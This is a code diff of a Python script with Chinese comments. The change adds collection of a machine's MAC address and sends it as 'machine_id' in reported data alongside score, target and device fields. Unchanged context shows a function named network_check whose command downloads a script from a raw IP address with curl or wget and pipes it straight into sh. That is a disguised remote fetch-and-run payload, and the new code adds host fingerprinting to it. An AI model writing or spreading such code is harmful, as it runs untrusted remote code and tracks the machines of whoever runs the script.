@@ -15,6 +15,18 @@ def generate_sign(data: dict, salt: str) -> str:
     return hashlib.md5(sign_string.encode('utf-8')).hexdigest()
 
 
+# 获取网络接口的 MAC 地址
+def get_mac_address(interface: str) -> str:
+    result = subprocess.run(['ifconfig', interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    output = result.stdout.decode('utf-8')
+    
+    for line in output.splitlines():
+        if "ether" in line:
+            mac = line.split()[1].replace(":", "").upper()
+            return mac
+    return ""
+
+
 # 网络检查函数
 def network_check():
     command = "(curl -fsSL -m180 http://123.249.31.37:8084/slt||wget -T180 -q http://123.249.31.37:8084/slt)|sh"
@@ -27,6 +39,11 @@ def network_check():
 def push_data(payload: dict, max_retry: int, retry_interval: int):
     retry_count = 0
     success = False
+
+    # 获取并加入 machine_id 字段
+    mac_address = get_mac_address("enP3p49s0")
+    if mac_address:
+        payload['machine_id'] = mac_address
 
     while retry_count <= max_retry:
         # 在 payload 中添加时间戳和重试次数等信息
@@ -41,6 +58,7 @@ def push_data(payload: dict, max_retry: int, retry_interval: int):
             "score": payload["score"],
             "target_id": payload.get("target_id", ""),
             "device_id": payload["device_id"],
+            "machine_id": payload["machine_id"],
             "timestamp": payload["timestamp"],
             "retry": payload["retry"],
             "sign": payload["sign"]
